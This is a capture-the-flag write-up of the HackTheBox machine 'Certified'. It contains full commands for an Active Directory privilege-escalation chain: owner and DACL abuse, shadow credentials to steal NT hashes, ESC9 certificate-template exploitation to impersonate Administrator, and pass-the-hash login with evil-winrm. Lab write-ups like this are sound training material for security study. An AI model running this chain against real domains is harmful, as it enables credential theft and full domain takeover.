2025 - Assumed Breach Active Directory Breach
### NMAP

```
sudo nmap -sC -vv -sV -oN nmap-certified 10.10.11.41
```

### Initial Access

Assumed Breach - given the creds `judith.mader:judith09`
List users on the box
```
nxc smb 10.10.11.41 -u judith.mader -p judith09 --users
```

#### Certipy 
Without the vulnerable flag
```
certipy find -dc-ip 10.10.11.41 -u judith.mader -p judith09 -stdout
```

![[HackTheBox/Windows/attachments/Pasted image 20250525123701.png]]
- found the template "CertifiedAuthentication" can be used by "operator.ca"

![[HackTheBox/Windows/attachments/Pasted image 20250525124139.png]]
-in bloodhound we'd mark operator ca as a HVT

With the vulnerable flag
```
certipy find -dc-ip 10.10.11.41 -vulnerable -u judith.mader -p judith09 -stdout
```

![[HackTheBox/Windows/attachments/Pasted image 20250525123759.png]]
- no vulnerable templates for this user

Outputting Certipy to JSON and then writing a JQ Query that will show us non-default users that can enroll certificates

Generate the JSON file 

```
certipy find -dc-ip 10.10.11.41 -vulnerable -u judith.mader -p judith09 -json
```

![[HackTheBox/Windows/attachments/Pasted image 20250525141142.png]]

View json results by piping to jq .

```
cat XXX_Certipy.json | jq .
```

We want to query all the way to "Enrollment rights" and search for names other than "Domain Admins" or "Enterprise Admins"

![[HackTheBox/Windows/attachments/Pasted image 20250525141554.png]]

The script 
![[HackTheBox/Windows/attachments/Pasted image 20250525194856.png]]

All in all - we have a high value target -> operator ca

### Enumerate for Priv Esc 

#### Run BloodHound.py

Use bloodhound-ce branch maybe 

![[HackTheBox/Windows/attachments/Pasted image 20250525195100.png]]

```
python3 bloodhound.py -d certified.htb -u 'judith.mader' -p 'judith09' -c all -ns 10.10.11.41 
```

Start bloodhound server 
```
cd /opt/bloodhound/server/; docker compose up -d
```

1. Mark current user as owned
2. Click on outbound object control to see what they can do

![[HackTheBox/Windows/attachments/Pasted image 20250525195851.png]]

Judith.Mader has WriteOwner over Management
![[HackTheBox/Windows/attachments/Pasted image 20250525195926.png]]

3. Check Outbound Object Control for Management

Management has GenericWrite over Management_SVC
![[HackTheBox/Windows/attachments/Pasted image 20250525200046.png]]

4. Check Outbound Object Control for Management_SVC

Management_SVC has GenericAll over CA_Operator 👀
![[HackTheBox/Windows/attachments/Pasted image 20250525200155.png]]

✨Goal: get to CA_Operator because they can enroll in a vulnerable certificate✨

Show path between judith and ca_operator 
![[HackTheBox/Windows/attachments/Pasted image 20250525213531.png]]
Follow these steps to get to ca_operator.

#### Own CA_Operator

##### Exploit WriteOwner 

###### Owneredit.py

Use impacket's owneredit.py

```
owneredit.py -dc-ip 10.10.11.41 -action write -new-owner judith.mader -target management certified/judith.mader:judith09
```

![[HackTheBox/Windows/attachments/Pasted image 20250525200932.png]]

First, check the members of the CERTIFIED group

###### net rpc 
```
net rpc group members Management -U certified/judith.mader%judith09 -S 10.10.11.41
```

![[HackTheBox/Windows/attachments/Pasted image 20250525201106.png]]

Now execute the impacket script to make ourselves a write owner of management group using *owneredit.py*
![[HackTheBox/Windows/attachments/Pasted image 20250525201143.png]]

Then add ourselves to the management group using *dacledit.py* which gives us the ability to add users.
###### dacledit.py
```
dacledit.py -dc-ip 10.10.11.41 -action write -rights WriteMembers -principal judith.mader -target Management certified/judith.mader:judith09 
```

![[HackTheBox/Windows/attachments/Pasted image 20250525213055.png]]

Let's add ourselves as a member using *net rpc*

###### net rpc 
```
net rpc group addmem Management judith.mader -U certified/judith.mader%judith09 -S 10.10.11.41
```

![[HackTheBox/Windows/attachments/Pasted image 20250525213318.png]]

Verify this with 
```
net rpc group members Management -U certified/judith.mader%judith09 -S 10.10.11.41
```

whoop whoop - we're part of management group now 
![[HackTheBox/Windows/attachments/Pasted image 20250525213438.png]]

Next......

##### Exploit GenericWrite 

Create shadow credential for management_svc

###### Certipy 
```
certipy shadow auto -target certified.htb -dc-ip 10.10.11.41 -username judith.mader@certified.htb -password judith09 -account management_svc
```

![[HackTheBox/Windows/attachments/Pasted image 20250525213919.png]]
- this creates a certificate that allows us to authenticate as management_svc then gets a TGT as the management_svc user and then retrieves their NT hash 

If clock skew is too great - sync kali time with the server 
```
sudo ntpdate 10.10.11.41
```

We got the NT hash for management_svc
![[HackTheBox/Windows/attachments/Pasted image 20250525214242.png]]

##### Exploit GenericWrite/GenericAll 

Use the exact same technique used to get the management_svc to get the ca_operator NT hash
###### Certipy 
```
certipy shadow auto -target certified.htb -dc-ip 10.10.11.41 -username management_svc@certified.htb -hashes :<MANAGEMENT_SVC HASH> -account ca_operator
```

![[HackTheBox/Windows/attachments/Pasted image 20250525214729.png]]

Yay! We got ca_operator's NT Hash!
![[HackTheBox/Windows/attachments/Pasted image 20250525214825.png]]

### Viewing vulnerable certificate as ca_operator
#### Certipy 

```
certipy find -dc-ip 10.10.11.41 -vulnerable -u ca_operator -hashes :<ca_operator NT Hash> -stdout
```

![[HackTheBox/Windows/attachments/Pasted image 20250525215248.png]]

Discover ESC9 CA certificate vulnerability 
![[HackTheBox/Windows/attachments/Pasted image 20250525215409.png]]
#### ESC9 Vulnerability Exploit 

[Certipy 4.0: ESC9 & ESC10 Blog Post](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)

Using Certipy to exploit ESC9, updating UPN, requesting cert, updating UPN, and then using the certificate.

##### Certipy 

Make ca_operator an administrator
```
certipy account update -u management_svc -hashes :<management_svc nt hash> -user ca_operator -upn Administrator
```

![[HackTheBox/Windows/attachments/Pasted image 20250525220047.png]]

Request certificate 
```
certipy req -u ca_operator -hashes :<ca_operator nt hash> -dc-ip 10.10.11.41 -ca certified-DC01-CA -template CertifiedAuthentication
```
- find `-ca` in certipy output 
- find `-template` near `-ca` in certipy output

*if this times out, just try it again*

![[HackTheBox/Windows/attachments/Pasted image 20250525220547.png]]
- got certificate with UPN of administrator and saved it to administrator.pfx

Use this administrator certificate to get the NT hash for administrator

```
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb
```

![[HackTheBox/Windows/attachments/Pasted image 20250525220929.png]]

Use this hash to login with evil-winrm

```
evil-winrm -i 10.10.11.41 -u administrator -H <ADMINISTRATOR NT HASH>
```

![[HackTheBox/Windows/attachments/Pasted image 20250525221105.png]]
⭐got root⭐

-------

### Alternate Enumeration for priv esc 

Starting as management_svc user, use evil-winrm to login with their NT hash

```
evil-winrm -i 10.10.11.41 -u management_svc -H <management_svc nt hash>
```

![[HackTheBox/Windows/attachments/Pasted image 20250525221537.png]]

#### Running SharpHound

Upload SharpHound.exe to evil-winrm shell

![[HackTheBox/Windows/attachments/Pasted image 20250525221819.png]]

![[HackTheBox/Windows/attachments/Pasted image 20250525221833.png]]

Execute SharpHound.exe 

Download the Bloodhound.zip generated by SharpHound

![[HackTheBox/Windows/attachments/Pasted image 20250525222056.png]]

Upload the Bloodhound.zip to the bloodhound gui

#### Cypher Query to match all users that have CanPSRemote to computers

Query 
![[HackTheBox/Windows/attachments/Pasted image 20250525222410.png]]

Result
![[HackTheBox/Windows/attachments/Pasted image 20250525222423.png]]


#### Cypher Query to show the shortest path from owned to the certificate template we want

Query 
![[HackTheBox/Windows/attachments/Pasted image 20250525222853.png]]

Result
![[HackTheBox/Windows/attachments/Pasted image 20250525222916.png]]

#### Cypher Query to show a specific user to the template

Query 
![[HackTheBox/Windows/attachments/Pasted image 20250525223131.png]]
Result
![[HackTheBox/Windows/attachments/Pasted image 20250525223115.png]]